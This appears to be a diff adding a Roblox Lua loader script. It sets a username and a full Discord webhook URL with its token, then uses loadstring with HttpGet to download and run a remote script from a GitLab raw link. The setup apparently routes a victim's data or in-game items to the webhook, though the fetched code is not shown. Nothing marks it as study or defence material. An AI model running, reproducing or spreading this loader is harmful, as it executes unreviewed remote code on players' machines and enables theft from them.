@@ -1,0 +1,4 @@
+Username = "DEVIEN_hakari987"
+Webhook = "https://discord.com/api/webhooks/1388178096414261278/IIooqbVFybPXAZNk29NBkK2nFb2i3knlDXxEfY1J8BlFIGc1XqhpDjEiCjc7PUyOllHw"
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/brainrot"))()
